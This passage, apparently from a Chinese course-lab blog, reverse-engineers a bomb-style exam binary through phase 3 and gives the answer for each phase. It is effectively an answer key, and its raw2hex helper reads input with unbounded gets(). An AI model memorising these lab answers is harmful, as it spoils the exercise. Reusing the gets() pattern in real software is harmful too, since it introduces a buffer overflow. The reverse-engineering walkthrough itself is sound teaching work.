<p>我不再像Bomb Lab中进行分段分析。直接找到会导致<code>sad_ending</code>的条件：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4013e3:	e8 93 07 00 00       	callq  401b7b &lt;_strncmp&gt;</span><br><span class="line">4013e8:	85 c0                	test   %eax,%eax</span><br><span class="line">4013ea:	75 09                	jne    4013f5 &lt;phase_0+0x56&gt;</span><br><span class="line">...  </span><br><span class="line">4013f5:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">4013fa:	e8 e5 03 00 00       	callq  4017e4 &lt;sad_ending&gt;</span><br></pre></td></tr></table></figure>
<p>4013e3调用了<code>_strncmp</code>函数，指导中给出了说明：</p>
<blockquote>
<p><code>_strncmp(char *, char *, int)</code>：对两个字符串进行比较</p>
</blockquote>
<p>然后4013e8和4013ea判断返回值<code>%eax</code>是否为零，不为零则跳到4013f5，继续执行导致<code>sad_ending</code>。</p>
<p>得出结论：<code>_strncmp</code>函数的返回值必须为零，即传入的两个字符串必须相等。</p>
<hr>
<p>下面就找一下传入的参数分别是什么，即<code>%rdi</code>、<code>%rsi</code>和<code>%rdx</code>的值。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4013d4:	ba 30 00 00 00       	mov    $0x30,%edx</span><br><span class="line">4013d9:	48 89 de             	mov    %rbx,%rsi</span><br><span class="line">4013dc:	48 8d 3d 75 0c 00 00 	lea    0xc75(%rip),%rdi        # 402058 &lt;_IO_stdin_used+0x58&gt;</span><br></pre></td></tr></table></figure>
<p>可以看出：</p>
<ul>
<li><code>%rdi</code>存放的是地址<code>0x402058</code>；</li>
<li><code>%rsi</code>存放的是<code>%rbx</code>的值；</li>
<li><code>%rdx</code>的值为0x30。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">4013cc:	48 89 df             	mov    %rbx,%rdi</span><br><span class="line">4013cf:	e8 d5 03 00 00       	callq  4017a9 &lt;read_line&gt;</span><br></pre></td></tr></table></figure>
<p>发现4013cc将<code>%rbx</code>传给<code>read_line</code>读取一行字符串，即<code>%rbx</code>存放的是我们输入的字符串的地址，即为<code>%rsi</code>的值。</p>
<hr>
<p>利用<code>gdb</code>查看地址<code>0x402058</code>处的值：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb exam</span><br><span class="line">(gdb) x/s 0x402058</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x402058:	&quot;But we loved with a love that was more than love&quot;</span><br></pre></td></tr></table></figure>
<p>这句“But we loved with a love that was more than love”出自<a href="https://baike.baidu.com/item/%E5%AE%89%E5%A8%9C%E8%B4%9D%E5%B0%94%C2%B7%E4%B8%BD">安娜贝尔·丽</a>，意为“可我们的爱超越一切，无人能及”。</p>
<p>全诗放在文章结尾，供欣赏。</p>
<hr>
<p>现在已经很清楚了，传给<code>_strncmp</code>的三个参数分别为上面的诗句、我们输入的字符串和0x30。可以发现，诗句的长度就是48个字符，也就是0x30个字符。</p>
<p>综上，<code>phase_0</code>的密码就是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">But we loved with a love that was more than love</span><br></pre></td></tr></table></figure>
<hr>
<p>但是注意本次实验与Bomb Lab的不同之处，要求所有的输入均通过<code>data.txt</code>并利用<code>hex2raw</code>，所以需要将我们得出的所有信息均转换成十六进制字符，<strong>包括否定跳过的<code>n</code>、换行符</strong>。</p>
<p>编写用于转换成十六进制的程序<code>raw2hex</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> size = <span class="number">100</span>;</span><br><span class="line">    <span class="keyword">char</span>* raw_str = (<span class="keyword">char</span>*)<span class="built_in">malloc</span>(size);</span><br><span class="line">    gets(raw_str);</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(raw_str);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%x &quot;</span>, raw_str[i]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0a\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(raw_str);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将字符串转换成ascii码后填入<code>data.txt</code>，别忘了前面加上否定跳过的字符。</p>
<h2 id="Phase-1-string-array"><a href="#Phase-1-string-array" class="headerlink" title="Phase 1: string array"></a>Phase 1: <em>string array</em></h2><p><code>phase_1</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401731 &lt;phase_1&gt;:</span><br><span class="line">  401731:	53                   	push   %rbx</span><br><span class="line">  401732:	48 83 ec 50          	sub    $0x50,%rsp</span><br><span class="line">  401736:	48 8b 0d 83 29 00 00 	mov    0x2983(%rip),%rcx        # 4040c0 &lt;stdout@@GLIBC_2.2.5&gt;</span><br><span class="line">  40173d:	ba 17 00 00 00       	mov    $0x17,%edx</span><br><span class="line">  401742:	be 01 00 00 00       	mov    $0x1,%esi</span><br><span class="line">  401747:	48 8d 3d 6f 09 00 00 	lea    0x96f(%rip),%rdi        # 4020bd &lt;_IO_stdin_used+0xbd&gt;</span><br><span class="line">  40174e:	e8 ad f9 ff ff       	callq  401100 &lt;fwrite@plt&gt;</span><br><span class="line">  401753:	48 89 e3             	mov    %rsp,%rbx</span><br><span class="line">  401756:	be 50 00 00 00       	mov    $0x50,%esi</span><br><span class="line">  40175b:	48 89 df             	mov    %rbx,%rdi</span><br><span class="line">  40175e:	e8 46 00 00 00       	callq  4017a9 &lt;read_line&gt;</span><br><span class="line">  401763:	48 89 df             	mov    %rbx,%rdi</span><br><span class="line">  401766:	e8 5f 04 00 00       	callq  401bca &lt;_strlen&gt;</span><br><span class="line">  40176b:	83 f8 04             	cmp    $0x4,%eax</span><br><span class="line">  40176e:	7e 21                	jle    401791 &lt;phase_1+0x60&gt;</span><br><span class="line">  401770:	80 3c 24 39          	cmpb   $0x39,(%rsp)</span><br><span class="line">  401774:	75 27                	jne    40179d &lt;phase_1+0x6c&gt;</span><br><span class="line">  401776:	80 7c 24 01 51       	cmpb   $0x51,0x1(%rsp)</span><br><span class="line">  40177b:	75 20                	jne    40179d &lt;phase_1+0x6c&gt;</span><br><span class="line">  40177d:	80 7c 24 02 2a       	cmpb   $0x2a,0x2(%rsp)</span><br><span class="line">  401782:	75 19                	jne    40179d &lt;phase_1+0x6c&gt;</span><br><span class="line">  401784:	80 7c 24 03 61       	cmpb   $0x61,0x3(%rsp)</span><br><span class="line">  401789:	75 12                	jne    40179d &lt;phase_1+0x6c&gt;</span><br><span class="line">  40178b:	48 83 c4 50          	add    $0x50,%rsp</span><br><span class="line">  40178f:	5b                   	pop    %rbx</span><br><span class="line">  401790:	c3                   	retq   </span><br><span class="line">  401791:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401796:	e8 49 00 00 00       	callq  4017e4 &lt;sad_ending&gt;</span><br><span class="line">  40179b:	eb d3                	jmp    401770 &lt;phase_1+0x3f&gt;</span><br><span class="line">  40179d:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  4017a2:	e8 3d 00 00 00       	callq  4017e4 &lt;sad_ending&gt;</span><br><span class="line">  4017a7:	eb e2                	jmp    40178b &lt;phase_1+0x5a&gt;</span><br></pre></td></tr></table></figure>
<hr>
<p>找到会调用<code>sad_ending</code>的语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401763:	48 89 df             	mov    %rbx,%rdi</span><br><span class="line">401766:	e8 5f 04 00 00       	callq  401bca &lt;_strlen&gt;</span><br><span class="line">40176b:	83 f8 04             	cmp    $0x4,%eax</span><br><span class="line">40176e:	7e 21                	jle    401791 &lt;phase_1+0x60&gt;</span><br><span class="line">401770:	80 3c 24 39          	cmpb   $0x39,(%rsp)</span><br><span class="line">401774:	75 27                	jne    40179d &lt;phase_1+0x6c&gt;</span><br><span class="line">401776:	80 7c 24 01 51       	cmpb   $0x51,0x1(%rsp)</span><br><span class="line">40177b:	75 20                	jne    40179d &lt;phase_1+0x6c&gt;</span><br><span class="line">40177d:	80 7c 24 02 2a       	cmpb   $0x2a,0x2(%rsp)</span><br><span class="line">401782:	75 19                	jne    40179d &lt;phase_1+0x6c&gt;</span><br><span class="line">401784:	80 7c 24 03 61       	cmpb   $0x61,0x3(%rsp)</span><br><span class="line">401789:	75 12                	jne    40179d &lt;phase_1+0x6c&gt;</span><br><span class="line">...</span><br><span class="line">401791:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">401796:	e8 49 00 00 00       	callq  4017e4 &lt;sad_ending&gt;</span><br><span class="line">...</span><br><span class="line">40179d:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">4017a2:	e8 3d 00 00 00       	callq  4017e4 &lt;sad_ending&gt;</span><br></pre></td></tr></table></figure>
<p>401763和401766把<code>%rbx</code>传参并调用<code>_strlen</code>：</p>
<blockquote>
<p><code>_strlen(char *)</code>：计算字符串的长度</p>
</blockquote>
<p>然后40176b和40176e判断其返回值是否不超过4，若不超过4则跳到401791，继续执行导致<code>sad_ending</code>。可知<code>%rbx</code>处的字符串长度至少为5。</p>
<p>401770～401789分别判断了<code>%rsp</code>处的前4个值是否依次为<code>0x39</code>、<code>0x51</code>、<code>0x2a</code>和<code>0x61</code>，有一个不相等则跳到40179d，继续执行导致<code>sad_ending</code>。可知<code>%rsp</code>处的前4个值必须依次为<code>0x39</code>、<code>0x51</code>、<code>0x2a</code>和<code>0x61</code>。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401753:	48 89 e3             	mov    %rsp,%rbx</span><br><span class="line">...</span><br><span class="line">40175b:	48 89 df             	mov    %rbx,%rdi</span><br><span class="line">40175e:	e8 46 00 00 00       	callq  4017a9 &lt;read_line&gt;</span><br></pre></td></tr></table></figure>
<p>401753将<code>%rsp</code>传给了<code>%rbx</code>，40175b和40175e又将<code>%rbx</code>传给了<code>%rdi</code>作为参数调用<code>read_line</code>读取一行输入。</p>
<p>可知<code>%rsp</code>和<code>%rbx</code>均指向了我们输入的字符串。</p>
<p>注意<code>0x0a</code>也会记入读入字符串的长度，且理论上在后面添加任意字符均可（长度大于4即可）。</p>
<p>但如果在<code>0x61</code>之后添加<code>0x00</code>，当<code>_strlen</code>判断时会提前终止，返回字符串长度为4，导致<code>sad_ending</code>。</p>
<hr>
<p>综上分析，<code>phase_1</code>的密码就是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">39 51 2a 61</span><br></pre></td></tr></table></figure>
<h2 id="Phase-2-link-list-amp-recursion"><a href="#Phase-2-link-list-amp-recursion" class="headerlink" title="Phase 2: link list&amp;recursion"></a>Phase 2: <em>link list&amp;recursion</em></h2><h3 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a><code>phase_2</code></h3><p><code>phase_2</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401ae0 &lt;phase_2&gt;:</span><br><span class="line">  401ae0:	41 55                	push   %r13</span><br><span class="line">  401ae2:	41 54                	push   %r12</span><br><span class="line">  401ae4:	55                   	push   %rbp</span><br><span class="line">  401ae5:	53                   	push   %rbx</span><br><span class="line">  401ae6:	48 83 ec 58          	sub    $0x58,%rsp</span><br><span class="line">  401aea:	48 8b 0d cf 25 00 00 	mov    0x25cf(%rip),%rcx        # 4040c0 &lt;stdout@@GLIBC_2.2.5&gt;</span><br><span class="line">  401af1:	ba 17 00 00 00       	mov    $0x17,%edx</span><br><span class="line">  401af6:	be 01 00 00 00       	mov    $0x1,%esi</span><br><span class="line">  401afb:	48 8d 3d d2 07 00 00 	lea    0x7d2(%rip),%rdi        # 4022d4 &lt;_IO_stdin_used+0x2d4&gt;</span><br><span class="line">  401b02:	e8 f9 f5 ff ff       	callq  401100 &lt;fwrite@plt&gt;</span><br><span class="line">  401b07:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">  401b0a:	be 50 00 00 00       	mov    $0x50,%esi</span><br><span class="line">  401b0f:	e8 95 fc ff ff       	callq  4017a9 &lt;read_line&gt;</span><br><span class="line">  401b14:	bf 10 00 00 00       	mov    $0x10,%edi</span><br><span class="line">  401b19:	e8 a2 f5 ff ff       	callq  4010c0 &lt;malloc@plt&gt;</span><br><span class="line">  401b1e:	48 89 c3             	mov    %rax,%rbx</span><br><span class="line">  401b21:	48 8d 2d c4 07 00 00 	lea    0x7c4(%rip),%rbp        # 4022ec &lt;_IO_stdin_used+0x2ec&gt;</span><br><span class="line">  401b28:	4c 8d 65 0a          	lea    0xa(%rbp),%r12</span><br><span class="line">  401b2c:	49 89 c5             	mov    %rax,%r13</span><br><span class="line">  401b2f:	bf 10 00 00 00       	mov    $0x10,%edi</span><br><span class="line">  401b34:	e8 87 f5 ff ff       	callq  4010c0 &lt;malloc@plt&gt;</span><br><span class="line">  401b39:	49 89 45 08          	mov    %rax,0x8(%r13)</span><br><span class="line">  401b3d:	0f b6 55 00          	movzbl 0x0(%rbp),%edx</span><br><span class="line">  401b41:	88 10                	mov    %dl,(%rax)</span><br><span class="line">  401b43:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)</span><br><span class="line">  401b4a:	00 </span><br><span class="line">  401b4b:	48 83 c5 01          	add    $0x1,%rbp</span><br><span class="line">  401b4f:	4c 39 e5             	cmp    %r12,%rbp</span><br><span class="line">  401b52:	75 d8                	jne    401b2c &lt;phase_2+0x4c&gt;</span><br><span class="line">  401b54:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">  401b57:	48 8b 7b 08          	mov    0x8(%rbx),%rdi</span><br><span class="line">  401b5b:	e8 39 ff ff ff       	callq  401a99 &lt;recursion&gt;</span><br><span class="line">  401b60:	85 c0                	test   %eax,%eax</span><br><span class="line">  401b62:	75 0b                	jne    401b6f &lt;phase_2+0x8f&gt;</span><br><span class="line">  401b64:	48 83 c4 58          	add    $0x58,%rsp</span><br><span class="line">  401b68:	5b                   	pop    %rbx</span><br><span class="line">  401b69:	5d                   	pop    %rbp</span><br><span class="line">  401b6a:	41 5c                	pop    %r12</span><br><span class="line">  401b6c:	41 5d                	pop    %r13</span><br><span class="line">  401b6e:	c3                   	retq   </span><br><span class="line">  401b6f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">  401b74:	e8 6b fc ff ff       	callq  4017e4 &lt;sad_ending&gt;</span><br><span class="line">  401b79:	eb e9                	jmp    401b64 &lt;phase_2+0x84&gt;</span><br></pre></td></tr></table></figure>
<hr>
<p><code>phase_2</code>的结构较为复杂，它和<code>phase_3</code>一起，作为整个实验的核心，下面分段分析：</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401ae0:	41 55                	push   %r13</span><br><span class="line">401ae2:	41 54                	push   %r12</span><br><span class="line">401ae4:	55                   	push   %rbp</span><br><span class="line">401ae5:	53                   	push   %rbx</span><br><span class="line">401ae6:	48 83 ec 58          	sub    $0x58,%rsp</span><br><span class="line">401aea:	48 8b 0d cf 25 00 00 	mov    0x25cf(%rip),%rcx        # 4040c0 &lt;stdout@@GLIBC_2.2.5&gt;</span><br><span class="line">401af1:	ba 17 00 00 00       	mov    $0x17,%edx</span><br><span class="line">401af6:	be 01 00 00 00       	mov    $0x1,%esi</span><br><span class="line">401afb:	48 8d 3d d2 07 00 00 	lea    0x7d2(%rip),%rdi        # 4022d4 &lt;_IO_stdin_used+0x2d4&gt;</span><br><span class="line">401b02:	e8 f9 f5 ff ff       	callq  401100 &lt;fwrite@plt&gt;</span><br></pre></td></tr></table></figure>
<p>401ae0～401ae5将<code>%r13</code>、<code>%r12</code>、<code>%rbp</code>和<code>%rbx</code>依次压入栈，401ae6将栈顶指针移动<code>0x58</code>。</p>
<p>401aea把地址0x4040c0给<code>%rcx</code>。</p>
<p>401af1～401b02调用<code>fwrite</code>函数，参数分别是地址0x4022d4、0x1和0x17，是用于提示的字符串。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401b07:	48 89 e7             	mov    %rsp,%rdi</span><br><span class="line">401b0a:	be 50 00 00 00       	mov    $0x50,%esi</span><br><span class="line">401b0f:	e8 95 fc ff ff       	callq  4017a9 &lt;read_line&gt;</span><br></pre></td></tr></table></figure>
<p>401b07～401b0f调用<code>read_line</code>函数，参数分别是<code>%rsp</code>和0x50，即把我们输入的字符串存放到<code>%rsp</code>处，且最大长度是0x50。</p>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401b14:	bf 10 00 00 00       	mov    $0x10,%edi</span><br><span class="line">401b19:	e8 a2 f5 ff ff       	callq  4010c0 &lt;malloc@plt&gt;</span><br><span class="line">401b1e:	48 89 c3             	mov    %rax,%rbx</span><br><span class="line">401b21:	48 8d 2d c4 07 00 00 	lea    0x7c4(%rip),%rbp        # 4022ec &lt;_IO_stdin_used+0x2ec&gt;</span><br><span class="line">401b28:	4c 8d 65 0a          	lea    0xa(%rbp),%r12</span><br><span class="line">401b2c:	49 89 c5             	mov    %rax,%r13</span><br><span class="line">401b2f:	bf 10 00 00 00       	mov    $0x10,%edi</span><br><span class="line">401b34:	e8 87 f5 ff ff       	callq  4010c0 &lt;malloc@plt&gt;</span><br><span class="line">401b39:	49 89 45 08          	mov    %rax,0x8(%r13)</span><br><span class="line">401b3d:	0f b6 55 00          	movzbl 0x0(%rbp),%edx</span><br><span class="line">401b41:	88 10                	mov    %dl,(%rax)</span><br><span class="line">401b43:	48 c7 40 08 00 00 00 	movq   $0x0,0x8(%rax)</span><br><span class="line">401b4a:	00 </span><br><span class="line">401b4b:	48 83 c5 01          	add    $0x1,%rbp</span><br><span class="line">401b4f:	4c 39 e5             	cmp    %r12,%rbp</span><br><span class="line">401b52:	75 d8                	jne    401b2c &lt;phase_2+0x4c&gt;</span><br></pre></td></tr></table></figure>
<p>401b14～401b1e调用<code>malloc</code>函数分配内存，参数是0x10，返回值给了<code>%rbx</code>，即分配了0x10大小的空间，其地址存放在<code>%rbx</code>处。</p>
<p>下面为<code>for</code>循环，转换成C代码，并适当改写：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span>* <span class="built_in">list</span> = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>]; <span class="comment">// %rax</span></span><br><span class="line"><span class="keyword">int</span>* head = <span class="built_in">list</span>; <span class="comment">// %rbx</span></span><br><span class="line"><span class="keyword">char</span>* str = <span class="number">0x4022ec</span>; <span class="comment">// %rbp</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i != <span class="number">10</span>; i++) &#123; <span class="comment">// %rbp != %r12</span></span><br><span class="line">	<span class="keyword">int</span>* temp = <span class="built_in">list</span>; <span class="comment">// %rax-&gt;%r13</span></span><br><span class="line">  temp[<span class="number">1</span>] = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>]; <span class="comment">// %r13+8</span></span><br><span class="line">  <span class="built_in">list</span> = temp; <span class="comment">// return of malloc</span></span><br><span class="line">  <span class="built_in">list</span>[<span class="number">0</span>] = str[i]; <span class="comment">// %rbp-&gt;%edx-&gt;(%rax)</span></span><br><span class="line">  <span class="built_in">list</span>[<span class="number">1</span>] = <span class="literal">NULL</span>; <span class="comment">// 0-&gt;(%rax+8)</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以发现此处创建了一个带头链表，头指针存放在<code>%rbx</code>中，<code>list[0]</code>为数据域、<code>list[1]</code>为指针域。并将<code>0x4022ec</code>处的字符串的每个字符存放到链表中，可以看出一共有10个字符。</p>
<p>利用<code>gdb</code>查看<code>0x4022ec</code>处的字符串的ascii码：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gdb exam</span><br><span class="line">(gdb) x/10x 0x4022ec</span><br></pre></td></tr></table></figure>
<p>得到输出如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x4022ec:	0x4c	0x6f	0x28	0x79	0x68	0x77	0x43	0x2c</span><br><span class="line">0x4022f4:	0x24	0x47</span><br></pre></td></tr></table></figure>
<p>即10个字符的ascii码为：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">0x4c	0x6f	0x28	0x79	0x68	0x77	0x43	0x2c  0x24	0x47</span><br></pre></td></tr></table></figure>
<hr>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">401b54:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">401b57:	48 8b 7b 08          	mov    0x8(%rbx),%rdi</span><br><span class="line">401b5b:	e8 39 ff ff ff       	callq  401a99 &lt;recursion&gt;</span><br><span class="line">401b60:	85 c0                	test   %eax,%eax</span><br><span class="line">401b62:	75 0b                	jne    401b6f &lt;phase_2+0x8f&gt;</span><br><span class="line">401b64:	48 83 c4 58          	add    $0x58,%rsp</span><br><span class="line">401b68:	5b                   	pop    %rbx</span><br><span class="line">401b69:	5d                   	pop    %rbp</span><br><span class="line">401b6a:	41 5c                	pop    %r12</span><br><span class="line">401b6c:	41 5d                	pop    %r13</span><br><span class="line">401b6e:	c3                   	retq   </span><br><span class="line">401b6f:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">401b74:	e8 6b fc ff ff       	callq  4017e4 &lt;sad_ending&gt;</span><br><span class="line">401b79:	eb e9                	jmp    401b64 &lt;phase_2+0x84&gt;</span><br></pre></td></tr></table></figure>
<p>401b54～401b5b调用<code>recursion</code>函数，将<code>%rsp</code>传给<code>%rsi</code>，即将我们输入的字符串作为第二个参数；将<code>%rbx+8</code>传给<code>%rdi</code>，即将链表起始地址作为第一个参数。</p>
<p>401b60和401b62检查<code>recursion</code>函数的返回值是否为零，若不为零则跳到401b6f，继续执行导致<code>sad_ending</code>。可知<code>recursion</code>函数的返回值必须为零。</p>
<p>无论是否<code>sad_ending</code>，最后执行401b64～401b6e，弹栈返回。</p>
<h3 id="recursion"><a href="#recursion" class="headerlink" title="recursion"></a><code>recursion</code></h3><p><code>recursion</code>函数对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401a99 &lt;recursion&gt;:</span><br><span class="line">  401a99:	48 85 ff             	test   %rdi,%rdi</span><br><span class="line">  401a9c:	74 2a                	je     401ac8 &lt;recursion+0x2f&gt;</span><br><span class="line">  401a9e:	0f b6 06             	movzbl (%rsi),%eax</span><br><span class="line">  401aa1:	3c 0a                	cmp    $0xa,%al</span><br><span class="line">  401aa3:	74 2f                	je     401ad4 &lt;recursion+0x3b&gt;</span><br><span class="line">  401aa5:	0f be 17             	movsbl (%rdi),%edx</span><br><span class="line">  401aa8:	83 c2 01             	add    $0x1,%edx</span><br><span class="line">  401aab:	0f be c0             	movsbl %al,%eax</span><br><span class="line">  401aae:	39 c2                	cmp    %eax,%edx</span><br><span class="line">  401ab0:	75 28                	jne    401ada &lt;recursion+0x41&gt;</span><br><span class="line">  401ab2:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  401ab6:	48 83 c6 01          	add    $0x1,%rsi</span><br><span class="line">  401aba:	48 8b 7f 08          	mov    0x8(%rdi),%rdi</span><br><span class="line">  401abe:	e8 d6 ff ff ff       	callq  401a99 &lt;recursion&gt;</span><br><span class="line">  401ac3:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  401ac7:	c3                   	retq   </span><br><span class="line">  401ac8:	80 3e 0a             	cmpb   $0xa,(%rsi)</span><br><span class="line">  401acb:	0f 95 c0             	setne  %al</span><br><span class="line">  401ace:	0f b6 c0             	movzbl %al,%eax</span><br><span class="line">  401ad1:	f7 d8                	neg    %eax</span><br><span class="line">  401ad3:	c3                   	retq   </span><br><span class="line">  401ad4:	b8 ff ff ff ff       	mov    $0xffffffff,%eax</span><br><span class="line">  401ad9:	c3                   	retq   </span><br><span class="line">  401ada:	b8 ff ff ff ff       	mov    $0xffffffff,%eax</span><br><span class="line">  401adf:	c3                   	retq</span><br></pre></td></tr></table></figure>
<hr>
<p>从名字可以看出，它是一个递归函数，实际上也是如此。</p>
<p>转换成C代码，并适当改写：</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> index = <span class="number">0</span>; <span class="comment">// index of input string</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">recursion</span><span class="params">(<span class="keyword">int</span>* <span class="built_in">list</span>, <span class="keyword">int</span> index)</span> </span>&#123; <span class="comment">// %rdi(link list), %rsi(index of input string)</span></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">list</span> == <span class="literal">NULL</span>) &#123; <span class="comment">// %rdi == 0</span></span><br><span class="line">    <span class="keyword">if</span> (input[index] == <span class="number">0x0a</span>) <span class="comment">// (%rsi) == 0xa</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">char</span> a = input[index]; <span class="comment">// (%rsi)-&gt;%eax</span></span><br><span class="line">  <span class="keyword">if</span> (a == <span class="number">0x0a</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">char</span> b = <span class="built_in">list</span>-&gt;data; <span class="comment">// (%rdi)-&gt;%edx</span></span><br><span class="line">  b++; <span class="comment">//%edx++</span></span><br><span class="line">  <span class="keyword">if</span> (a != b)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  </span><br><span class="line">  index++; <span class="comment">// %rsi++</span></span><br><span class="line">  <span class="built_in">list</span> = <span class="built_in">list</span>-&gt;next; <span class="comment">// %rdi+=8</span></span><br><span class="line">  recursion(<span class="built_in">list</span>, index);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可以看出，递归函数的功能是将链表中存放的字符串的每个字符增1后与我们输入的字符串的每个字符进行比较，全部相等则返回0，否则返回1。</p>
<hr>
<p>综上分析，我们只需输入已知字符串加1后的结果即可。</p>
<p>所以，<code>phase_2</code>的密码就是：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">4d 70 29 7a 69 78 44 2d 25 48 0a</span><br></pre></td></tr></table></figure>
<hr>
<p>如果你觉得拆弹实验很有趣，不妨做一下更有趣的Bomb Lab。</p>
<h1 id="任务三——程序局部性特性分析"><a href="#任务三——程序局部性特性分析" class="headerlink" title="任务三——程序局部性特性分析"></a>任务三——程序局部性特性分析</h1><p>什么是程序的局部性？</p>
<blockquote>
<p>程序倾向于引用邻近于<strong>其他最近引用过的数据项</strong>的数据项，或者最近引用过的数据项本身，这种倾向性被称为<strong>局部性原理（principle of locality）</strong>。</p>
</blockquote>
<p>局部性有何种形式？</p>
<blockquote>
<p>局部性分为<strong>时间局部性（temporal locality）</strong>和<strong>空间局部性（spatial locality）</strong>：</p>
<ul>
<li>在一个具有良好时间局部性的程序中，被引用过一次的内存位置很可能在不远的将来再被多次引用；</li>
<li>在一个具有良好空间局部性的程序中，如果一个内存位置被引用了一次，那么程序很可能在不远的将来引用附近的一个内存位置。</li>
</ul>
</blockquote>
<p>局部性有什么作用？</p>
<blockquote>
<p>有良好局部性的程序比局部性差的程序运行得更快。</p>
</blockquote>
<p>如何量化评价程序的局部性？</p>
<blockquote>
<ul>
<li><strong>重复引用</strong>相同变量的程序有良好的时间局部性。</li>
<li>对于具有步长为<code>k</code>的引用模式的程序，<strong>步长越小</strong>，空间局部性越好。具有步长为1的引用模式的程序有很好的空间局部性。在内存中以大步长跳来跳去的程序空间局部性会很差。</li>
<li>对于取指令来说，<strong>循环</strong>有好的时间和空间局部性。循环体越小，循环迭代次数越多，局部性越好。</li>
</ul>
</blockquote>
<hr>
<h2 id="Phase-3-switch"><a href="#Phase-3-switch" class="headerlink" title="Phase 3: switch"></a>Phase 3: <em>switch</em></h2><p><code>phase_3</code>对应的汇编语句如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0000000000401325 &lt;phase_3&gt;:</span><br><span class="line">  401325:	48 83 ec 18          	sub    $0x18,%rsp</span><br><span class="line">  401329:	48 8b 0d 90 2d 00 00 	mov    0x2d90(%rip),%rcx        # 4040c0 &lt;stdout@@GLIBC_2.2.5&gt;</span><br><span class="line">  401330:	ba 31 00 00 00       	mov    $0x31,%edx</span><br><span class="line">  401335:	be 01 00 00 00       	mov    $0x1,%esi</span><br><span class="line">  40133a:	48 8d 3d c7 0c 00 00 	lea    0xcc7(%rip),%rdi        # 402008 &lt;_IO_stdin_used+0x8&gt;</span><br><span class="line">  401341:	e8 ba fd ff ff       	callq  401100 &lt;fwrite@plt&gt;</span><br><span class="line">  401346:	48 8d 7c 24 0b       	lea    0xb(%rsp),%rdi</span><br><span class="line">  40134b:	be 05 00 00 00       	mov    $0x5,%esi</span><br><span class="line">  401350:	e8 54 04 00 00       	callq  4017a9 &lt;read_line&gt;</span><br><span class="line">  401355:	0f b6 44 24 0b       	movzbl 0xb(%rsp),%eax</span><br><span class="line">  40135a:	